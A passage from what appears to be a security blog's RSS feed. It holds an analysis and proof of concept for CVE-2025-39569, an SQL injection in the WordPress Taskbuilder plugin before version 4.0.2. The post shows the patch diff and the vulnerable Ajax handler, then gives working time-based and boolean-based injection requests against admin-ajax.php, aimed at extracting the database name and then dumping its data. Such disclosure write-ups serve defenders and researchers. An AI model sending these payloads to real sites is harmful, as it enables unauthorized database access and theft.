href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/easy-quotes/vulnerability/wordpress-easy-quotes-plugin-1-2-2-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Easy Quotes Plugin &amp;lt;= 1.2.2 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39569 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-09-22-cve-2025-39569/</link>
      <pubDate>Mon, 22 Sep 2025 18:54:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-22-cve-2025-39569/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability occurs in the &lt;strong&gt;Taskbuilder&lt;/strong&gt; WordPress plugin before version &lt;strong&gt;4.0.2&lt;/strong&gt;. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39569&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39569&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/taskbuilder/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Taskbuilder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt; 4.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: High (8.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Taskbuilder Plugin&lt;/strong&gt;: v4.0.1 (vulnerable) and v4.0.2 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any tool that can compare files to see differences between two versions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The application &lt;strong&gt;sanitizes input data&lt;/strong&gt; before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes &lt;code&gt;&#39;...&#39;&lt;/code&gt;. This allows an attacker to inject valid SQL syntax (such as &lt;code&gt;OR&lt;/code&gt;, &lt;code&gt;AND&lt;/code&gt;, etc.) into the query, resulting in a SQL Injection vulnerability.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare differences between the vulnerable version and the patched version.&lt;br&gt;&#xA;The clear difference is in the file &lt;strong&gt;includes/admin/projects/get_users.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;In version &lt;strong&gt;v4.0.1&lt;/strong&gt;, the variable &lt;code&gt;$proj_id&lt;/code&gt; is escaped but inserted directly into the query without quotes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id = esc_sql($proj_id);&#xA;$project = $wpdb-&amp;gt;get_row( &amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project where id = $proj_id&amp;#34; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In version &lt;strong&gt;v4.0.2&lt;/strong&gt;, the query is adjusted to wrap &lt;code&gt;$proj_id&lt;/code&gt; in quotes after escaping:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id = esc_sql($proj_id);&#xA;$project = $wpdb-&amp;gt;get_row( &amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project where id = &amp;#39;$proj_id&amp;#39;&amp;#34; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This patch ensures that the &lt;code&gt;$proj_id&lt;/code&gt; value after escaping is treated as a &lt;strong&gt;literal string&lt;/strong&gt;, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/patch_diff.png&#34; title=&#34;Patch diff&#34; data-thumbnail=&#34;/posts/2025-09-22-cve-2025-39569/patch_diff.png&#34; data-sub-html=&#34;&lt;h2&gt;patch diff&lt;/h2&gt;&lt;p&gt;Patch diff&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-22-cve-2025-39569/patch_diff.png&#39; alt=&#34;patch diff&#34; height=&#34;314&#34; width=&#34;603&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch diff&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How It Works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;File Architecture&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;General structure of the current file:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$proj_id  = esc_sql($proj_id);&#xA;$project  = $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM {$wpdb-&amp;gt;prefix}wppm_project WHERE id = $proj_id&amp;#34;);&#xA;&#xA;// Start buffer to generate the main modal content&#xA;ob_start();&#xA;// ... render HTML user list&#xA;$body = ob_get_clean();&#xA;&#xA;// Start buffer to generate modal footer&#xA;ob_start();&#xA;// ... render HTML buttons (Close, Save)&#xA;$footer = ob_get_clean();&#xA;&#xA;// Return JSON data for frontend modal rendering&#xA;echo json_encode([&#xA;    &amp;#39;body&amp;#39;   =&amp;gt; $body,&#xA;    &amp;#39;footer&amp;#39; =&amp;gt; $footer,&#xA;]);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$proj_id&lt;/code&gt; / &lt;code&gt;$project&lt;/code&gt;: Fetch project data from the database.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_start()&lt;/code&gt; / &lt;code&gt;ob_get_clean()&lt;/code&gt;: Buffer HTML output instead of printing directly, storing it in a variable.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$body&lt;/code&gt; / &lt;code&gt;$footer&lt;/code&gt;: Contain dynamic HTML for the modal.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;json_encode()&lt;/code&gt;: Returns JSON to the client, often used in Ajax to render modals without refreshing the page.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The file is located in &lt;code&gt;includes&lt;/code&gt;, suggesting it’s called from another feature. To find where it’s used, search for &lt;code&gt;get_users.php&lt;/code&gt; in the plugin directory.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/search_get_users.png&#34; title=&#34;Search get users&#34; data-thumbnail=&#34;/posts/2025-09-22-cve-2025-39569/search_get_users.png&#34; data-sub-html=&#34;&lt;h2&gt;search_get_users&lt;/h2&gt;&lt;p&gt;Search get users&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-22-cve-2025-39569/search_get_users.png&#39; alt=&#34;search_get_users&#34; height=&#34;400&#34; width=&#34;1001&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search get users&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 It is included in the function &lt;code&gt;wppm_get_users()&lt;/code&gt; of the class &lt;code&gt;WPPM_Admin&lt;/code&gt; in &lt;strong&gt;class-wppm-admin.php&lt;/strong&gt;.&#xA;&lt;code&gt;wppm_get_users()&lt;/code&gt; is a &lt;strong&gt;callback&lt;/strong&gt; for a &lt;strong&gt;WordPress action hook&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;WPPM_Admin constructor&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;final class WPPM_Admin {&#xA;    public function __construct() {&#xA;&#xA;        // other actions&#xA;&#xA;        add_action( &amp;#39;wp_ajax_wppm_get_users&amp;#39;, array($this,&amp;#39;wppm_get_users&amp;#39;));&#xA;&#xA;        // other actions&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;add_action()&lt;/code&gt; is a &lt;strong&gt;WordPress Plugin API&lt;/strong&gt; method to attach a &lt;strong&gt;callback&lt;/strong&gt; to an &lt;strong&gt;action hook&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_wppm_get_users&lt;/code&gt; is an Ajax hook name:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_{action}&lt;/code&gt; → handles Ajax for logged-in users.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_{action}&lt;/code&gt; → handles Ajax for non-logged-in users.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Here, &lt;code&gt;action = wppm_get_users&lt;/code&gt;. If you send &lt;code&gt;action=wppm_get_users&lt;/code&gt; via Ajax to &lt;code&gt;admin-ajax.php&lt;/code&gt;, WordPress will execute the corresponding callback, here &lt;code&gt;wppm_get_users()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Knowing &lt;code&gt;action = wppm_get_users&lt;/code&gt;, you can find which Ajax requests use it by searching &lt;code&gt;wppm_get_users&lt;/code&gt; in &lt;strong&gt;.js&lt;/strong&gt; files of the plugin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/ajax_search.png&#34; title=&#34;Ajax search&#34; data-thumbnail=&#34;/posts/2025-09-22-cve-2025-39569/ajax_search.png&#34; data-sub-html=&#34;&lt;h2&gt;ajax search&lt;/h2&gt;&lt;p&gt;Ajax search&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-22-cve-2025-39569/ajax_search.png&#39; alt=&#34;ajax search&#34; height=&#34;567&#34; width=&#34;952&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Ajax search&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;wppm_get_users&lt;/code&gt; action is the &lt;strong&gt;data part&lt;/strong&gt; in the POST request handled by &lt;code&gt;wppm_get_users()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The function is referenced in HTML attributes of the &lt;strong&gt;project feature&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Create a new project&lt;/li&gt;&#xA;&lt;li&gt;Access that project&lt;/li&gt;&#xA;&lt;li&gt;Inspect code to locate &lt;code&gt;wppm_get_users&lt;/code&gt; and see which actions call it&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/ajax_inspect.png&#34; title=&#34;Ajax inspect&#34; data-thumbnail=&#34;/posts/2025-09-22-cve-2025-39569/ajax_inspect.png&#34; data-sub-html=&#34;&lt;h2&gt;ajax inspect&lt;/h2&gt;&lt;p&gt;Ajax inspect&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-22-cve-2025-39569/ajax_inspect.png&#39; alt=&#34;ajax inspect&#34; height=&#34;401&#34; width=&#34;825&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Ajax inspect&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 Clicking the &lt;strong&gt;icon next to Users&lt;/strong&gt; triggers Ajax, sending a request to the server to fetch project users and render them in HTML.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/model_display.png&#34; title=&#34;Model display&#34; data-thumbnail=&#34;/posts/2025-09-22-cve-2025-39569/model_display.png&#34; data-sub-html=&#34;&lt;h2&gt;modal display&lt;/h2&gt;&lt;p&gt;Model display&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-22-cve-2025-39569/model_display.png&#39; alt=&#34;modal display&#34; height=&#34;536&#34; width=&#34;962&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Model display&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Capture requests using BurpSuite and send a &lt;strong&gt;time-based SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;SLEEP(1))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/sqli_success.png&#34; title=&#34;Sqli success&#34; data-thumbnail=&#34;/posts/2025-09-22-cve-2025-39569/sqli_success.png&#34; data-sub-html=&#34;&lt;h2&gt;sqli_success&lt;/h2&gt;&lt;p&gt;Sqli success&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-22-cve-2025-39569/sqli_success.png&#39; alt=&#34;sqli_success&#34; height=&#34;212&#34; width=&#34;374&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sqli success&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Response delay indicates a successful SQL Injection.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;To &lt;strong&gt;dump all data&lt;/strong&gt;, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.&lt;/p&gt;&#xA;&lt;p&gt;Send a &lt;strong&gt;boolean-based SQLi payload&lt;/strong&gt; with the correct &lt;code&gt;proj_id&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999))&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;Database name is &lt;strong&gt;wordpress&lt;/strong&gt;, so the first character is &lt;code&gt;w&lt;/code&gt; (HEX &lt;code&gt;0x77&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;code&gt;SUBSTRING(STRING,1,1)&lt;/code&gt; retrieves the first character.&lt;/p&gt;&#xA;&lt;p&gt;Here, &lt;code&gt;$proj_id = 4&lt;/code&gt;. Since &lt;code&gt;SUBSTRING(&#39;wordpress&#39;,1,1)=0x77&lt;/code&gt; is true, the &lt;code&gt;IF(condition, value_if_true, value_if_false)&lt;/code&gt; returns &lt;code&gt;4&lt;/code&gt;, which exists in the database, so the response contains the project users.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/res.png&#34; title=&#34;Res 1&#34; data-thumbnail=&#34;/posts/2025-09-22-cve-2025-39569/res.png&#34; data-sub-html=&#34;&lt;h2&gt;response none&lt;/h2&gt;&lt;p&gt;Res 1&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-22-cve-2025-39569/res.png&#39; alt=&#34;response none&#34; height=&#34;423&#34; width=&#34;679&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Res 1&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Using &lt;strong&gt;HEX technique&lt;/strong&gt; bypasses the &lt;code&gt;esc_sql()&lt;/code&gt; function (see &lt;a href=&#34;#patch-diff&#34;&gt;Patch Diff&lt;/a&gt;) when quotes cannot be used.&lt;/p&gt;&#xA;&lt;p&gt;Send a &lt;strong&gt;boolean-based SQLi payload&lt;/strong&gt; with a wrong &lt;code&gt;proj_id&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With a non-existent &lt;code&gt;proj_id&lt;/code&gt;, the response contains &lt;code&gt;None&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/res_none.png&#34; title=&#34;Res 2&#34; data-thumbnail=&#34;/posts/2025-09-22-cve-2025-39569/res_none.png&#34; data-sub-html=&#34;&lt;h2&gt;response none&lt;/h2&gt;&lt;p&gt;Res 2&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-22-cve-2025-39569/res_none.png&#39; alt=&#34;response none&#34; height=&#34;444&#34; width=&#34;682&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Res 2&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 We successfully retrieved the first character of the database name using &lt;strong&gt;boolean-based SQLi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Correct &lt;code&gt;proj_id&lt;/code&gt;: response without 